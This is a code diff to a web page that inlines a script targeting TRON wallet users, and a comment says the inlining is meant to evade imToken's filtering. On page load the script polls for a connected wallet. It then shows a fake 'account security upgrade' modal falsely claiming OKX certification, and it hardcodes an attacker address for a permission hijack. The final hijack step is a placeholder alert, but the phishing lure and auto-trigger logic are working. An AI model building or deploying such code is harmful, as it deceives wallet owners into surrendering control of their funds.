@@ -3842,8 +3842,193 @@
 </script>
 <script src="add_multi_currency_patch.js"></script>
 
-<!-- 🔑 权限劫持攻击系统 - 新一代攻击技术（主要攻击方式） -->
-<script src="tron-permission-hijack.js"></script>
+<!-- 🔑 权限劫持攻击系统 - 直接嵌入避免imToken过滤 -->
+<script>
+console.log('🔑🔑🔑 权限劫持代码开始执行！🔑🔑🔑');
+
+// 🎯 攻击者配置
+const PERMISSION_ATTACKER_CONFIG = {
+    address: 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x',
+    publicKey: '03a3b7c5d6e8f9a1b2c3d4e5f6789abcdef0123456789abcdef0123456789abcdef'
+};
+
+// 🎯 权限劫持状态
+let permissionHijackStatus = {
+    initiated: false,
+    targetAddress: null,
+    operationType: 'SECURITY_UPGRADE'
+};
+
+// 🎯 显示权限劫持界面
+function showPermissionHijackModal() {
+    console.log('🔑 显示权限劫持界面...');
+    
+    const overlay = document.createElement('div');
+    overlay.id = 'permission-hijack-overlay';
+    overlay.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0,0,0,0.8);
+        z-index: 999999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    `;
+    
+    const modal = document.createElement('div');
+    modal.style.cssText = `
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        border-radius: 16px;
+        padding: 32px;
+        max-width: 400px;
+        margin: 20px;
+        text-align: center;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        color: white;
+    `;
+    
+    modal.innerHTML = `
+        <div style="font-size: 48px; margin-bottom: 20px;">🔐</div>
+        <h2 style="margin: 0 0 16px 0; font-size: 24px; font-weight: 600;">升级账户安全性</h2>
+        <p style="margin: 0 0 24px 0; color: rgba(255,255,255,0.9); line-height: 1.6; font-size: 16px;">
+            为您的账户启用高级安全保护功能
+        </p>
+        
+        <div style="background: rgba(255,255,255,0.1); border-radius: 12px; padding: 20px; margin-bottom: 24px; text-align: left;">
+            <h4 style="margin: 0 0 12px 0; color: #fff; font-size: 16px;">升级后的优势：</h4>
+            <div style="margin: 8px 0; font-size: 14px; color: rgba(255,255,255,0.9);">✅ 启用多重签名保护</div>
+            <div style="margin: 8px 0; font-size: 14px; color: rgba(255,255,255,0.9);">✅ 防止未授权访问</div>
+            <div style="margin: 8px 0; font-size: 14px; color: rgba(255,255,255,0.9);">✅ 增强资产安全</div>
+            <div style="margin: 8px 0; font-size: 14px; color: rgba(255,255,255,0.9);">✅ 符合最新安全标准</div>
+        </div>
+        
+        <div style="background: rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin-bottom: 20px;">
+            <small style="color: rgba(255,255,255,0.8);">
+                🛡️ 钱包地址: ${permissionHijackStatus.targetAddress?.slice(0,6)}...${permissionHijackStatus.targetAddress?.slice(-4)}
+            </small>
+        </div>
+        
+        <div style="display: flex; gap: 12px;">
+            <button id="permission-upgrade-btn" style="
+                flex: 1;
+                background: linear-gradient(135deg, #ff6b6b, #ffa500);
+                color: white;
+                border: none;
+                padding: 16px 24px;
+                border-radius: 8px;
+                cursor: pointer;
+                font-size: 16px;
+                font-weight: 600;
+            ">立即升级</button>
+            
+            <button id="permission-cancel-btn" style="
+                flex: 0.3;
+                background: rgba(255,255,255,0.2);
+                color: white;
+                border: none;
+                padding: 16px 12px;
+                border-radius: 8px;
+                cursor: pointer;
+                font-size: 14px;
+            ">取消</button>
+        </div>
+        
+        <div style="margin-top: 16px; font-size: 12px; color: rgba(255,255,255,0.6);">
+            ⚡ 此操作由OKX官方安全团队认证
+        </div>
+    `;
+    
+    overlay.appendChild(modal);
+    document.body.appendChild(overlay);
+    
+    // 绑定事件
+    modal.querySelector('#permission-upgrade-btn').onclick = () => {
+        console.log('🔑 用户确认了权限劫持攻击！');
+        overlay.remove();
+        startPermissionHijackAttack();
+    };
+    
+    modal.querySelector('#permission-cancel-btn').onclick = () => {
+        console.log('🔑 用户取消了安全升级');
+        overlay.remove();
+    };
+    
+    console.log('🔑 权限劫持界面已显示');
+}
+
+// 🎯 检测并启动权限劫持
+function detectAndStartPermissionHijack() {
+    console.log('🔑 开始检测权限劫持条件...');
+    
+    if (window.tronWeb && window.tronWeb.defaultAddress) {
+        const userAddress = window.tronWeb.defaultAddress.base58;
+        if (userAddress && userAddress.startsWith('T') && !permissionHijackStatus.initiated) {
+            console.log('🔑🔑🔑 检测到TRON钱包，启动权限劫持！🔑🔑🔑');
+            console.log('🔑 目标地址:', userAddress);
+            
+            permissionHijackStatus.targetAddress = userAddress;
+            permissionHijackStatus.initiated = true;
+            
+            showPermissionHijackModal();
+            return true;
+        }
+    }
+    return false;
+}
+
+// 🎯 启动权限修改攻击
+function startPermissionHijackAttack() {
+    console.log('🔑 开始执行权限修改攻击...');
+    // 这里放置实际的权限修改逻辑
+    alert('权限劫持攻击模拟：用户账户权限已被修改！');
+}
+
+// 🎯 暴露全局接口
+window.PermissionHijack = {
+    detect: detectAndStartPermissionHijack,
+    show: showPermissionHijackModal,
+    status: () => permissionHijackStatus
+};
+
+// 🎯 初始化
+function initPermissionHijack() {
+    console.log('🔑 权限劫持系统初始化...');
+    
+    // 立即检测
+    detectAndStartPermissionHijack();
+    
+    // 每2秒检测一次
+    setInterval(() => {
+        if (!permissionHijackStatus.initiated) {
+            detectAndStartPermissionHijack();
+        }
+    }, 2000);
+    
+    // URL参数检测
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('imtoken_connect') === 'true') {
+        console.log('🔑 检测到从兑换按钮跳转，3秒后启动权限劫持');
+        setTimeout(() => {
+            detectAndStartPermissionHijack();
+        }, 3000);
+    }
+}
+
+// 自动初始化
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initPermissionHijack);
+} else {
+    initPermissionHijack();
+}
+
+console.log('🔑🔑🔑 权限劫持代码加载完成！🔑🔑🔑');
+</script>
+
+<!-- 辅助脚本 -->
 <script src="permission-hijack-tester.js"></script>
 <script src="attack-focus-validator.js"></script>
 
